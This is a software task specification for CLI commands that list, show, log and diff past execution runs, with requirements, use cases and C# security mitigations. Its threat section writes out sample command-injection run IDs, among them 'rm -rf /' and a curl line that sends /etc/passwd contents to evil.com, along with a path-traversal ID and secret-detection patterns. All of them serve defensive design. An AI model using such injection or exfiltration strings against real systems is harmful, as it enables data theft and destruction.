# Task 021.b: run show/logs/diff CLI Commands

**Priority:** P1 – High  
**Tier:** S – Core Infrastructure  
**Complexity:** 5 (Fibonacci points)  
**Phase:** Phase 4 – Execution Layer  
**Dependencies:** Task 021 (Artifact Collection), Task 050 (CLI), Task 011 (Workspace DB)  

---

## Description

### Overview

Task 021.b implements CLI commands for inspecting past execution runs. Users MUST be able to view run history, read logs, and compare outputs. These commands provide visibility into execution behavior and enable debugging, auditing, and root cause analysis.

### Business Value

1. **Debugging Acceleration**: Quick access to previous outputs speeds root cause analysis
2. **Audit Trail Access**: Compliance teams can review execution history on demand
3. **Regression Detection**: Diff capability reveals what changed between runs
4. **Scripting Enablement**: JSON output enables automation and CI integration
5. **Operational Visibility**: Teams gain insight into execution patterns and failures
6. **Historical Analysis**: Trend identification across multiple runs

### Core Commands

| Command | Purpose |
|---------|---------|
| `acode runs list` | List all runs with summary info |
| `acode runs show {id}` | Display detailed run metadata |
| `acode runs logs {id}` | Stream stdout/stderr from run |
| `acode runs diff {id1} {id2}` | Compare two runs |

### Scope

This task covers:
1. **List Command**: Filtering, sorting, pagination of run history
2. **Show Command**: Detailed metadata display with environment redaction
3. **Logs Command**: Streaming log access with tail/head support
4. **Diff Command**: Unified diff output with color support
5. **Output Formats**: Human-readable text, JSON, YAML
6. **Performance**: Efficient queries and streaming for large datasets

### Integration Points

| Component | Integration Type | Data Flow |
|-----------|------------------|-----------|
| Workspace DB (Task 011) | Run Metadata | DB → RunRepository |
| Artifact Storage (Task 021.a) | Log Files | Files → ArtifactReader |
| Operating Modes (Task 001) | Mode Constraints | ModeService → Commands |
| CLI Framework (Task 050) | Command Registration | Commands → CLI |

### Failure Modes

| Failure Mode | Detection | Recovery |
|--------------|-----------|----------|
| Run ID not found | DB query returns null | Exit 1, clear message |
| Artifacts missing | File not found | Partial data with warning |
| Invalid filters | Validation failure | Exit 2, usage help |
| DB corruption | Query exception | Suggest rebuild command |
| Large log OOM | Memory monitoring | Use streaming reader |

### Scope Boundaries

- ✅ IN SCOPE: CLI commands for run inspection
- ❌ OUT OF SCOPE: Run storage (Task 021), artifact structure (Task 021.a), export (Task 021.c)

### Operating Mode Compliance

All commands MUST respect Task 001 operating modes:
- Air-gapped mode: No network operations
- Commands work entirely offline
- No external service dependencies

---

## Use Cases

### Use Case 1: Developer Debugging Failed CI Run (Jordan, Backend Engineer)

**Persona:** Jordan is a backend engineer who received a notification that the nightly CI build failed. The CI system only shows "Build failed with exit code 1" without details.

**Before (Manual Log Hunting - 25 minutes):**
1. SSH into CI server (2 min - VPN connection, password lookup)
2. Navigate to CI workspace directory (3 min - remember path, check multiple locations)
3. List recent build directories: `ls -lt /var/ci/builds/` (1 min)
4. Open build log: `less /var/ci/builds/2024-01-15-03-00/build.log` (2 min)
5. Scroll through 50,000 lines to find error (10 min - manual search, missed context)
6. Check stderr separately: `less /var/ci/builds/2024-01-15-03-00/stderr.log` (2 min)
7. Compare with previous successful build manually (5 min - open two terminals, visual diff)
8. **Total time:** 25 minutes, high friction, context switching

**After (Acode CLI - 2 minutes):**
1. List recent runs: `acode runs list --status failed --limit 5` (10 sec)
2. View failed run details: `acode runs show run-20240115-ci-build` (5 sec - shows exit code, duration, task)
3. Read error logs: `acode runs logs run-20240115-ci-build --tail 100` (5 sec - sees error immediately)
4. Compare with last success: `acode runs diff run-20240114-ci-build run-20240115-ci-build --output-only` (10 sec - highlights what changed)
5. Identify root cause: New dependency version broke API contract (visible in diff)
6. **Total time:** 2 minutes, low friction, no SSH required

**Metrics:**
- Time saved: 23 minutes per failed build investigation
- Developer productivity: +92% improvement
- Context switches eliminated: SSH, VPN, file system navigation
- Annual ROI (assuming 3 failed builds per week): 23 min × 3 builds × 52 weeks = 3,588 minutes/year = **59.8 hours saved per developer**
- Cost savings at $100/hour: **$5,980/year per developer**

---

### Use Case 2: Security Team Auditing Command Execution History (Riley, Security Auditor)

**Persona:** Riley is a security auditor who must verify that all production deployments followed approved processes during Q4 2023 compliance review. Audit requires proof that no unauthorized commands were executed.

**Before (Manual Audit - 8 hours for quarterly review):**
1. Request access to production CI logs from DevOps team (30 min - ticket submission, approval wait)
2. Download log archives for Oct-Dec 2023 (15 min - 2.3GB download over VPN)
3. Extract compressed logs: `tar xzf logs-q4.tar.gz` (10 min)
4. Manually grep through thousands of files (120 min - slow, error-prone):
   ```bash
   find logs/ -name "*.log" -exec grep -l "deploy" {} \;
   ```
5. Parse each log file to extract: timestamp, command, user, exit code (180 min - manual Excel entry)
6. Cross-reference with approved deployment list (60 min - manual comparison)
7. Identify anomalies and investigate each (90 min - open individual logs)
8. Generate compliance report in required format (30 min - manual formatting)
9. **Total time:** 8 hours per quarterly audit

**After (Acode CLI with JSON output - 45 minutes):**
1. Query all deployment runs in Q4: `acode runs list --from 2023-10-01 --to 2023-12-31 --task deploy --format json > q4-deploys.json` (5 sec)
2. Extract required fields using jq (15 min - scripted):
   ```bash
   jq '[.[] | {id, timestamp, task, user, exit_code, duration_sec}]' q4-deploys.json > audit-summary.json
   ```
3. Filter for anomalies (failures, unusual durations): `jq '.[] | select(.exit_code != 0 or .duration_sec > 600)' audit-summary.json` (2 min)
4. Investigate each anomaly: `acode runs show <run-id> --format json` (10 min - 5 anomalies × 2 min each)
5. Generate compliance report: `python generate-audit-report.py audit-summary.json` (3 min - automated template)
6. Review and annotate findings (15 min)
7. **Total time:** 45 minutes per quarterly audit

**Metrics:**
- Time saved: 7.25 hours per quarterly audit
- Audit efficiency: +90.6% improvement
- Data accuracy: 100% (no manual transcription errors)
- Automation potential: JSON output enables scripted analysis
- Annual ROI (4 quarterly audits): 7.25 hours × 4 = **29 hours saved per year**
- Cost savings at $150/hour (auditor rate): **$4,350/year**

---

### Use Case 3: DevOps Identifying Regression Between Releases (Sam, DevOps Lead)

**Persona:** Sam is a DevOps lead responsible for ensuring stable releases. After deploying v2.5.0, customer support reports that the dashboard loads slower than v2.4.0. Sam needs to identify what changed.

**Before (Manual Comparison - 2 hours):**
1. Locate v2.4.0 build artifacts on build server (10 min - search Jira for build number, SSH to server)
2. Locate v2.5.0 build artifacts (5 min - recent build)
3. Download both artifact sets to local machine (10 min - 500MB each over slow network)
4. Compare build logs manually (40 min - open side-by-side, scan for differences):
   - Check dependency versions
   - Check build times
   - Look for warnings
5. Compare asset sizes: `du -sh v2.4.0/dist/ v2.5.0/dist/` (2 min)
6. Notice bundle size increased 30%, but unclear why (30 min - manual inspection of files)
7. Identify culprit: New analytics library added (8MB uncompressed)
8. **Total time:** 2 hours, incomplete analysis

**After (Acode CLI - 5 minutes):**
1. Find relevant build runs: `acode runs list --task build --branch main --limit 10` (5 sec)
2. Identify v2.4.0 and v2.5.0 runs by timestamp (10 sec - visible in list output)
3. Compare runs: `acode runs diff run-20231201-v240 run-20240115-v250 --show-artifacts` (15 sec)
4. Diff output highlights:
   ```diff
   Artifact size changes:
   + dist/main.js: 2.1MB → 2.8MB (+700KB, +33%)
   + node_modules/analytics-pro/: 0 → 8.2MB (NEW)

   Dependency changes:
   + analytics-pro@3.2.1 (new)

   Build time:
   2.4.0: 45 seconds
   2.5.0: 78 seconds (+33 seconds, +73%)
   ```
5. View full metadata for context: `acode runs show run-20240115-v250 --show-env` (5 sec - sees package.json changes)
6. Root cause identified: analytics-pro library added in commit abc123 (visible in run metadata)
7. **Total time:** 5 minutes, complete analysis

**Metrics:**
- Time saved: 1 hour 55 minutes per regression investigation
- Mean time to identify (MTTI): Reduced from 2 hours to 5 minutes (-96.8%)
- Comparison accuracy: Automated diff eliminates human error
- Actionable insights: Immediate visibility into size, time, dependency changes
- Annual ROI (assuming 2 regressions per month): 115 min × 2 × 12 = **2,760 minutes/year = 46 hours saved**
- Cost savings at $120/hour (DevOps rate): **$5,520/year**

---

### Combined ROI Summary for Use Cases

| Use Case | Time Saved | Annual Hours Saved | Annual Cost Savings |
|----------|------------|-------------------|---------------------|
| Developer debugging failed CI runs | 23 min/incident | 59.8 hours | $5,980 |
| Security auditing command history | 7.25 hours/audit | 29 hours | $4,350 |
| DevOps regression identification | 115 min/regression | 46 hours | $5,520 |
| **TOTAL** | | **134.8 hours/year** | **$15,850/year** |

**Payback Period:** Assuming 40 hours development effort at $100/hour = $4,000 investment, payback in **3.0 months**.

---

## Glossary / Terms

| Term | Definition |
|------|------------|
| Run | A single command execution with captured artifacts |
| Run ID | Unique identifier for a run (UUID or sequential) |
| Artifact | A file produced during execution (logs, results) |
| Workspace DB | SQLite database storing run metadata (Task 011) |
| Stdout | Standard output stream from executed command |
| Stderr | Standard error stream from executed command |
| Exit Code | Numeric return value from executed command |
| Diff | Comparison showing differences between two runs |
| Tail | Reading the last N lines of a log file |
| Pagination | Breaking large output into manageable pages |

---

## Out of Scope

- Run artifact storage (Task 021)
- Directory structure standards (Task 021.a)
- Export/bundle format (Task 021.c)
- Run deletion/cleanup
- Run re-execution
- Interactive log viewing (less/more style)
- Real-time log streaming during execution
- Remote run viewing

---

## Assumptions

### Technical Assumptions

1. **Workspace database exists** - Task 011 has created SQLite database with run tables
2. **Run records persisted** - All command executions are recorded with metadata
3. **Artifacts stored** - Stdout, stderr, and other artifacts saved to filesystem
4. **Unique run IDs** - Each run has a unique identifier (UUID or sequential)
5. **Metadata queryable** - Run metadata supports filtering and ordering
6. **Exit codes captured** - Command exit codes stored with run records

### CLI Assumptions

7. **Standard output format** - Tabular for humans, JSON for scripts
8. **Consistent filtering** - Same filter syntax across related commands
9. **Pagination support** - Large result sets handled efficiently
10. **Color output optional** - Disable colors for non-terminal output
11. **Exit codes meaningful** - CLI returns appropriate exit codes

### Data Assumptions

12. **Timestamps in UTC** - All stored times are UTC, display converts to local
13. **Logs accessible** - Log files remain on disk until explicitly deleted
14. **Diff possible** - Two runs can be compared if both exist
15. **No data loss** - Run data persisted reliably
16. **Reasonable history** - Expected <10K runs per workspace

---

## Functional Requirements

### FR-001 to FR-020: `acode runs list` Command

- FR-001: `acode runs list` MUST list all runs in reverse chronological order
- FR-002: Output MUST include run ID, timestamp, exit code, command summary
- FR-003: `--limit N` MUST restrict output to N most recent runs
- FR-004: `--since DATE` MUST filter runs after specified date
- FR-005: `--until DATE` MUST filter runs before specified date
- FR-006: `--status success` MUST filter to exit code 0 runs
- FR-007: `--status failed` MUST filter to non-zero exit code runs
- FR-008: `--command PATTERN` MUST filter by command containing pattern
- FR-009: `--format json` MUST output JSON array
- FR-010: `--format table` MUST output ASCII table (default)
- FR-011: Empty results MUST display "No runs found" message
- FR-012: Date parsing MUST support ISO 8601 format
- FR-013: Date parsing MUST support relative formats (1h, 1d, 1w)
- FR-014: Output MUST truncate long commands to fit terminal width
- FR-015: `--no-truncate` MUST display full command text
- FR-016: Exit code 0 for successful query (even if no results)
- FR-017: Exit code 1 for query errors
- FR-018: Query MUST use Workspace DB indexes
- FR-019: Query MUST NOT load artifact contents
- FR-020: Query MUST complete in <100ms for <10000 runs

### FR-021 to FR-040: `acode runs show` Command

- FR-021: `acode runs show {run-id}` MUST display detailed run info
- FR-022: Output MUST include run ID
- FR-023: Output MUST include start timestamp
- FR-024: Output MUST include end timestamp
- FR-025: Output MUST include duration
- FR-026: Output MUST include exit code
- FR-027: Output MUST include command executed
- FR-028: Output MUST include working directory
- FR-029: Output MUST include environment variables (redacted secrets)
- FR-030: Output MUST include artifact paths
- FR-031: Output MUST indicate which artifacts exist on disk
- FR-032: `--format json` MUST output JSON object
- FR-033: `--format yaml` MUST output YAML document
- FR-034: Unknown run ID MUST return exit code 1
- FR-035: Unknown run ID MUST display "Run not found: {id}"
- FR-036: Partial UUID match MUST be supported (first 8 chars)
- FR-037: Ambiguous partial match MUST list matching runs
- FR-038: Environment redaction MUST mask patterns matching secrets
- FR-039: Environment redaction MUST mask known sensitive vars
- FR-040: Environment redaction MUST be configurable via config

### FR-041 to FR-060: `acode runs logs` Command

- FR-041: `acode runs logs {run-id}` MUST display stdout and stderr
- FR-042: `--stdout` MUST display only stdout
- FR-043: `--stderr` MUST display only stderr
- FR-044: Default MUST interleave stdout and stderr with prefixes
- FR-045: Prefix format MUST be `[stdout]` or `[stderr]`
- FR-046: `--no-prefix` MUST omit stream prefixes
- FR-047: `--tail N` MUST display only last N lines
- FR-048: `--head N` MUST display only first N lines
- FR-049: `--follow` MUST NOT be supported (runs are complete)
- FR-050: Missing log file MUST display "No {stream} captured"
- FR-051: Empty log file MUST display "(empty)"
- FR-052: Large logs MUST stream without full memory load
- FR-053: Binary content MUST be detected and rejected
- FR-054: Binary detection MUST check first 8KB for null bytes
- FR-055: `--timestamps` MUST prefix each line with timestamp if available
- FR-056: Exit code 0 for successful log display
- FR-057: Exit code 1 for run not found
- FR-058: Exit code 2 for log file missing
- FR-059: Logs MUST be read directly from artifact files
- FR-060: Log display MUST NOT require DB access beyond run lookup

### FR-061 to FR-080: `acode runs diff` Command

- FR-061: `acode runs diff {run-id-1} {run-id-2}` MUST compare runs
- FR-062: Exit code difference MUST be displayed
- FR-063: Duration difference MUST be displayed
- FR-064: Stdout diff MUST be displayed
- FR-065: Stderr diff MUST be displayed
- FR-066: `--stdout-only` MUST diff only stdout
- FR-067: `--stderr-only` MUST diff only stderr
- FR-068: `--exit-code-only` MUST show only exit code comparison
- FR-069: Diff format MUST use unified diff format
- FR-070: Added lines MUST be prefixed with `+`
- FR-071: Removed lines MUST be prefixed with `-`
- FR-072: Context lines MUST be configurable via `--context N`
- FR-073: Default context MUST be 3 lines
- FR-074: `--color` MUST enable ANSI color output
- FR-075: `--no-color` MUST disable color output
- FR-076: Color default MUST respect terminal detection
- FR-077: Exit code 0 if runs are identical
- FR-078: Exit code 1 if runs differ
- FR-079: Exit code 2 if either run not found
- FR-080: Large file diff MUST stream without full memory load

---

## Non-Functional Requirements

### NFR-001 to NFR-010: Performance

- NFR-001: `runs list` MUST complete in <100ms for <10000 runs
- NFR-002: `runs show` MUST complete in <50ms
- NFR-003: `runs logs` MUST start streaming in <20ms
- NFR-004: `runs diff` MUST start output in <100ms
- NFR-005: Memory usage MUST NOT exceed 50MB for any operation
- NFR-006: Log streaming MUST use <1MB buffer regardless of file size
- NFR-007: Diff MUST use streaming algorithm for large files
- NFR-008: DB queries MUST use prepared statements
- NFR-009: Index usage MUST be verified via query plan
- NFR-010: Cold start MUST NOT require full DB scan

### NFR-011 to NFR-020: Reliability

- NFR-011: Commands MUST NOT corrupt DB or artifacts
- NFR-012: Read operations MUST be safe for concurrent access
- NFR-013: Partial artifact availability MUST NOT crash commands
- NFR-014: DB connection MUST timeout after 5 seconds
- NFR-015: File read errors MUST produce clear error messages
- NFR-016: Ctrl+C MUST gracefully terminate output
- NFR-017: Pipe to closed process MUST NOT produce stack trace
- NFR-018: Commands MUST work without write permissions
- NFR-019: Locked artifact files MUST produce clear error
- NFR-020: UTF-8 decoding errors MUST be handled gracefully

### NFR-021 to NFR-030: Security

- NFR-021: Environment variables MUST be redacted in show output
- NFR-022: Redaction patterns MUST include PASSWORD, SECRET, KEY, TOKEN
- NFR-023: Redaction MUST apply to both name and value patterns
- NFR-024: Custom redaction patterns MUST be configurable
- NFR-025: Log content MUST NOT be modified (redaction only in metadata)
- NFR-026: File path MUST be validated against artifact directory
- NFR-027: Path traversal attempts MUST be blocked
- NFR-028: Symlink following MUST be disabled
- NFR-029: Commands MUST NOT execute arbitrary code
- NFR-030: JSON output MUST escape special characters

---

## User Manual Documentation

### Quick Start

```bash
# List recent runs
acode runs list

# Show details of a specific run
acode runs show abc123

# View logs from a run
acode runs logs abc123

# Compare two runs
acode runs diff abc123 def456
```

### Command Reference

#### `acode runs list`

Lists execution runs with summary information.

```bash
acode runs list [options]

Options:
  --limit N         Show only N most recent runs (default: 20)
  --since DATE      Filter runs after this date
  --until DATE      Filter runs before this date  
  --status STATUS   Filter by status: success, failed
  --command PATTERN Filter by command pattern
  --format FORMAT   Output format: table (default), json
  --no-truncate     Show full command text
```

**Examples:**

```bash
# List last 10 runs
acode runs list --limit 10

# List runs from the last hour
acode runs list --since 1h

# List only failed runs
acode runs list --status failed

# List runs of test commands
acode runs list --command "test"

# JSON output for scripting
acode runs list --format json | jq '.[].exitCode'
```

#### `acode runs show`

Displays detailed information about a specific run.

```bash
acode runs show <run-id> [options]

Options:
  --format FORMAT   Output format: text (default), json, yaml
```

**Examples:**

```bash
# Show run details
acode runs show abc12345

# Partial ID match (first 8 characters)
acode runs show abc12345

# JSON output
acode runs show abc12345 --format json
```

#### `acode runs logs`

Displays stdout and/or stderr from a run.

```bash
acode runs logs <run-id> [options]

Options:
  --stdout          Show only stdout
  --stderr          Show only stderr
  --no-prefix       Omit [stdout]/[stderr] prefixes
  --tail N          Show last N lines
  --head N          Show first N lines
  --timestamps      Include timestamps if available
```

**Examples:**

```bash
# View all output
acode runs logs abc12345

# View only errors
acode runs logs abc12345 --stderr

# View last 50 lines
acode runs logs abc12345 --tail 50
```

#### `acode runs diff`

Compares two runs to identify differences.

```bash
acode runs diff <run-id-1> <run-id-2> [options]

Options:
  --stdout-only     Compare only stdout
  --stderr-only     Compare only stderr
  --exit-code-only  Compare only exit codes
  --context N       Lines of context (default: 3)
  --color           Force color output
  --no-color        Disable color output
```

**Examples:**

```bash
# Full comparison
acode runs diff abc12345 def67890

# Compare only output
acode runs diff abc12345 def67890 --stdout-only

# More context
acode runs diff abc12345 def67890 --context 10
```

### Configuration

Configuration in `.agent/config.yml`:

```yaml
runs:
  list:
    defaultLimit: 20
    truncateWidth: 80
  show:
    redactPatterns:
      - PASSWORD
      - SECRET
      - KEY
      - TOKEN
      - API_KEY
  logs:
    defaultTail: 1000
    maxLineLength: 10000
  diff:
    defaultContext: 3
    colorEnabled: auto  # auto, always, never
```

### Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success / Runs identical (diff) |
| 1 | Run not found / Runs differ (diff) |
| 2 | Invalid arguments / Missing artifacts |
| 3 | Database error |

### Troubleshooting

**Q: "Run not found" but I just ran something**

The run may not be committed to the DB yet. Wait a moment and retry. If persists, check DB integrity:

```bash
acode db check
```

**Q: Logs show "(empty)" but command had output**

Output capture may have failed. Check if the command was run with capture disabled.

**Q: Diff shows no differences but exit codes differ**

Use `--exit-code-only` to see exit code comparison separately.

**Q: Getting "Binary content detected"**

The log file contains binary data. Use external tools to view:

```bash
hexdump -C .acode/artifacts/{run-id}/stdout.txt
```

---

## Acceptance Criteria / Definition of Done

### Functionality

- [ ] AC-001: `acode runs list` displays runs in reverse chronological order
- [ ] AC-002: `acode runs list --limit N` restricts to N runs
- [ ] AC-003: `acode runs list --since` filters by start date
- [ ] AC-004: `acode runs list --status` filters by exit code
- [ ] AC-005: `acode runs list --format json` outputs valid JSON
- [ ] AC-006: `acode runs show {id}` displays full run details
- [ ] AC-007: `acode runs show` partial ID match works
- [ ] AC-008: `acode runs show` redacts sensitive environment variables
- [ ] AC-009: `acode runs logs {id}` displays stdout and stderr
- [ ] AC-010: `acode runs logs --stdout` filters to stdout only
- [ ] AC-011: `acode runs logs --stderr` filters to stderr only
- [ ] AC-012: `acode runs logs --tail N` shows last N lines
- [ ] AC-013: `acode runs diff` shows unified diff format
- [ ] AC-014: `acode runs diff` exit code reflects similarity
- [ ] AC-015: `acode runs diff --color` enables color output

### Safety/Policy

- [ ] AC-016: Environment redaction masks PASSWORD patterns
- [ ] AC-017: Environment redaction masks SECRET patterns
- [ ] AC-018: Environment redaction masks KEY patterns
- [ ] AC-019: Environment redaction masks TOKEN patterns
- [ ] AC-020: Path traversal attempts are blocked
- [ ] AC-021: Symlinks outside artifact dir are not followed
- [ ] AC-022: Commands work in read-only filesystem
- [ ] AC-023: No arbitrary code execution paths exist

### CLI/UX

- [ ] AC-024: Commands provide `--help` documentation
- [ ] AC-025: Invalid options produce clear error messages
- [ ] AC-026: Exit codes follow documented conventions
- [ ] AC-027: Color output respects terminal detection
- [ ] AC-028: Long output is paginated appropriately
- [ ] AC-029: Ctrl+C terminates gracefully

### Logging/Audit

- [ ] AC-030: Commands log operation to debug log
- [ ] AC-031: Errors include run ID in log context
- [ ] AC-032: Performance metrics logged for slow operations

### Performance

- [ ] AC-033: `runs list` completes in <100ms for 10000 runs
- [ ] AC-034: `runs show` completes in <50ms
- [ ] AC-035: `runs logs` starts streaming in <20ms
- [ ] AC-036: Memory usage stays under 50MB

### Tests

- [ ] AC-037: Unit tests achieve 90% coverage
- [ ] AC-038: Integration tests cover DB interactions
- [ ] AC-039: E2E tests verify CLI behavior

---

## Security Considerations

### Threat 1: Command Injection via Malicious Run IDs

**Risk:** If run IDs are passed unsanitized to shell commands (e.g., log readers, diff tools), attackers could inject shell commands. Example: run ID `run-123; rm -rf /` could execute destructive commands.

**Attack Scenario:**
1. Attacker controls run ID creation (malicious CI job, compromised API)
2. Crafts run ID: `run-abc"; curl http://evil.com/exfiltrate?data=$(cat /etc/passwd) #`
3. Developer runs: `acode runs logs "run-abc"; curl http://evil.com/..."`
4. Shell interprets as two commands: log display + data exfiltration
5. Sensitive data sent to attacker-controlled server

**Mitigation (C# - RunIdValidator with Shell Safety):**

```csharp
namespace Acode.Application.Runs;

public sealed class RunIdValidator
{
    private static readonly Regex ValidRunIdPattern = new(@"^run-[a-z0-9]{8,40}$", RegexOptions.Compiled);
    private static readonly char[] ShellMetacharacters = new[]
    {
        ';', '|', '&', '$', '`', '\n', '\r', '(', ')', '<', '>',
        '"', '\'', '\\', '*', '?', '[', ']', '{', '}', '~', '!'
    };

    public (bool IsValid, string Error) Validate(string runId)
    {
        // Rule 1: Not null or empty
        if (string.IsNullOrWhiteSpace(runId))
            return (false, "Run ID cannot be null or empty");

        // Rule 2: Strict format (run-<alphanumeric>)
        if (!ValidRunIdPattern.IsMatch(runId))
            return (false, "Run ID must match format: run-[a-z0-9]{8,40}");

        // Rule 3: No shell metacharacters (defense in depth)
        if (runId.IndexOfAny(ShellMetacharacters) >= 0)
            return (false, "Run ID contains forbidden shell metacharacters");

        // Rule 4: Length bounds (prevent buffer overflow in native tools)
        if (runId.Length < 12 || runId.Length > 50)
            return (false, "Run ID length must be between 12 and 50 characters");

        return (true, null);
    }

    public string Sanitize(string runId)
    {
        if (string.IsNullOrWhiteSpace(runId))
            throw new ArgumentException("Run ID cannot be null", nameof(runId));

        // Remove all non-alphanumeric except hyphen
        var sanitized = Regex.Replace(runId, @"[^a-z0-9\-]", "", RegexOptions.IgnoreCase);

        // Ensure starts with "run-"
        if (!sanitized.StartsWith("run-", StringComparison.OrdinalIgnoreCase))
            sanitized = "run-" + sanitized;

        // Truncate if too long
        if (sanitized.Length > 50)
            sanitized = sanitized.Substring(0, 50);

        return sanitized.ToLowerInvariant();
    }
}

// Usage in RunsLogsCommand
public class RunsLogsCommand
{
    private readonly RunIdValidator _validator;
    private readonly IArtifactReader _reader;

    public async Task<int> ExecuteAsync(string runId, bool follow)
    {
        // ALWAYS validate before ANY operations
        var (isValid, error) = _validator.Validate(runId);
        if (!isValid)
        {
            Console.Error.WriteLine($"Invalid run ID: {error}");
            return 2;
        }

        // Never pass run ID to shell - use .NET APIs directly
        var logPath = Path.Combine(".acode", "artifacts", runId, "stdout.txt");
        await _reader.StreamFileAsync(logPath, follow, CancellationToken.None);
        return 0;
    }
}
```

**Prevention:**
- Validate run IDs against strict regex before ANY operations
- Never construct shell commands with user input
- Use .NET file/process APIs directly (no `Process.Start("/bin/sh", $"-c cat {runId}")`)

---

### Threat 2: Path Traversal in Artifact Log Display

**Risk:** Malicious run IDs containing `../` sequences could read arbitrary files outside `.acode/artifacts/`. Example: `acode runs logs ../../../../etc/passwd` could expose sensitive system files.

**Attack Scenario:**
1. Attacker creates run with ID: `run-../../../../../../etc/passwd`
2. Developer runs: `acode runs logs run-../../../../../../etc/passwd`
3. Path constructed as: `.acode/artifacts/run-../../../../../../etc/passwd/stdout.txt`
4. Resolves to: `/etc/passwd/stdout.txt` (or `/etc/passwd` if directory check missing)
5. System password file displayed to attacker

**Mitigation (C# - SafePathResolver):**

```csharp
namespace Acode.Infrastructure.Artifacts;

public sealed class SafePathResolver
{
    private readonly string _artifactsRoot;

    public SafePathResolver(string workspaceRoot)
    {
        _artifactsRoot = Path.GetFullPath(Path.Combine(workspaceRoot, ".acode", "artifacts"));
    }

    public (bool IsValid, string ResolvedPath, string Error) ResolveSafePath(string runId, string fileName)
    {
        // Step 1: Validate run ID format
        if (string.IsNullOrWhiteSpace(runId) || runId.Contains("..") || runId.Contains("/") || runId.Contains("\\"))
            return (false, null, "Run ID contains path traversal sequences");

        // Step 2: Validate fileName (if provided)
        if (!string.IsNullOrEmpty(fileName))
        {
            if (fileName.Contains("..") || Path.IsPathRooted(fileName))
                return (false, null, "File name contains path traversal or absolute path");
        }

        // Step 3: Construct path using safe combination
        var runDirectory = Path.Combine(_artifactsRoot, runId);
        var fullPath = string.IsNullOrEmpty(fileName)
            ? runDirectory
            : Path.Combine(runDirectory, fileName);

        // Step 4: Resolve to absolute path (normalizes .. sequences)
        var resolvedPath = Path.GetFullPath(fullPath);

        // Step 5: CRITICAL - Verify resolved path is still within artifacts root
        if (!resolvedPath.StartsWith(_artifactsRoot, StringComparison.OrdinalIgnoreCase))
            return (false, null, $"Path escapes artifacts directory: {resolvedPath}");

        // Step 6: Verify path exists before returning
        if (!File.Exists(resolvedPath) && !Directory.Exists(resolvedPath))
            return (false, null, $"Path does not exist: {resolvedPath}");

        return (true, resolvedPath, null);
    }
}

// Usage in ArtifactReader
public class ArtifactReader : IArtifactReader
{
    private readonly SafePathResolver _pathResolver;

    public async Task<string> ReadLogAsync(string runId, string logType)
    {
        var fileName = logType switch
        {
            "stdout" => "stdout.txt",
            "stderr" => "stderr.txt",
            _ => throw new ArgumentException($"Invalid log type: {logType}")
        };

        // Resolve path safely - NEVER concatenate strings directly
        var (isValid, path, error) = _pathResolver.ResolveSafePath(runId, fileName);
        if (!isValid)
            throw new SecurityException($"Path traversal attempt blocked: {error}");

        // Safe to read - path is guaranteed within artifacts directory
        return await File.ReadAllTextAsync(path);
    }
}
```

**Prevention:**
- Always use `Path.GetFullPath()` to normalize paths
- Verify resolved paths start with expected root directory
- Never concatenate user input directly into file paths

---

### Threat 3: Sensitive Data Leakage in Run Diff Output

**Risk:** Diff command may expose secrets (API keys, passwords, tokens) when comparing runs with different environment variables or config files. Secrets intended for redaction in logs may bypass redaction in diff output.

**Attack Scenario:**
1. Developer compares two runs: `acode runs diff run-prod-deploy run-staging-deploy`
2. Diff includes environment variables section
3. Output shows:
   ```diff
   - API_KEY=sk-staging-abc123def456
   + API_KEY=sk-prod-xyz789ghi012
   ```
4. Production API key exposed in terminal, scrollback buffer, screen share
5. Attacker with screen recording access obtains production credentials

**Mitigation (C# - SecureRunDiffer with Redaction):**

```csharp
namespace Acode.Application.Runs;

public sealed class SecureRunDiffer
{
    private static readonly Regex[] SecretPatterns = new[]
    {
        new Regex(@"(?i)(api[_-]?key|password|secret|token|credential)[:=]\s*[^\s]{8,}", RegexOptions.Compiled),
        new Regex(@"sk-[a-zA-Z0-9]{48,}", RegexOptions.Compiled), // OpenAI keys
        new Regex(@"ghp_[a-zA-Z0-9]{36,}", RegexOptions.Compiled), // GitHub tokens
        new Regex(@"Bearer\s+[a-zA-Z0-9\-._~+/]+=*", RegexOptions.Compiled), // Bearer tokens
        new Regex(@"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----", RegexOptions.Compiled) // Private keys
    };

    private readonly IRunRepository _repository;

    public async Task<DiffResult> DiffRunsAsync(string runId1, string runId2, DiffOptions options)
    {
        var run1 = await _repository.GetByIdAsync(runId1);
        var run2 = await _repository.GetByIdAsync(runId2);

        if (run1 == null || run2 == null)
            throw new NotFoundException("One or both run IDs not found");

        var diff = new DiffResult
        {
            RunId1 = runId1,
            RunId2 = runId2,
            Timestamp = DateTime.UtcNow
        };

        // Compare metadata (safe fields only)
        diff.MetadataDiff = CompareMetadata(run1, run2);

        // Compare environment (WITH REDACTION)
        diff.EnvironmentDiff = CompareEnvironmentSecurely(
            run1.Environment,
            run2.Environment,
            redactSecrets: !options.NoRedaction // Default to redaction
        );

        // Compare artifacts (sizes only, not content, unless explicitly requested)
        diff.ArtifactsDiff = CompareArtifacts(run1.Artifacts, run2.Artifacts);

        return diff;
    }

    private Dictionary<string, string> CompareEnvironmentSecurely(
        Dictionary<string, string> env1,
        Dictionary<string, string> env2,
        bool redactSecrets)
    {
        var diff = new Dictionary<string, string>();

        // Keys only in env1
        foreach (var key in env1.Keys.Except(env2.Keys))
        {
            var value = redactSecrets ? RedactIfSecret(key, env1[key]) : env1[key];
            diff[$"- {key}"] = value;
        }

        // Keys only in env2
        foreach (var key in env2.Keys.Except(env1.Keys))
        {
            var value = redactSecrets ? RedactIfSecret(key, env2[key]) : env2[key];
            diff[$"+ {key}"] = value;
        }

        // Keys in both but with different values
        foreach (var key in env1.Keys.Intersect(env2.Keys))
        {
            if (env1[key] != env2[key])
            {
                var oldValue = redactSecrets ? RedactIfSecret(key, env1[key]) : env1[key];
                var newValue = redactSecrets ? RedactIfSecret(key, env2[key]) : env2[key];
                diff[$"~ {key}"] = $"{oldValue} → {newValue}";
            }
        }

        return diff;
    }

    private string RedactIfSecret(string key, string value)
    {
        // Redact by key name patterns
        if (Regex.IsMatch(key, @"(?i)(key|password|secret|token|credential)"))
            return "***REDACTED***";

        // Redact by value patterns
        foreach (var pattern in SecretPatterns)
        {
            if (pattern.IsMatch(value))
                return "***REDACTED***";
        }

        return value;
    }
}

// DiffOptions
public class DiffOptions
{
    public bool NoRedaction { get; set; } = false; // Requires explicit opt-in
    public bool ShowArtifactContent { get; set; } = false;
    public bool ColorOutput { get; set; } = true;
}
```

**Prevention:**
- Redact secrets by default in all output (opt-in to show)
- Use pattern matching to detect secrets (keys, tokens, passwords)
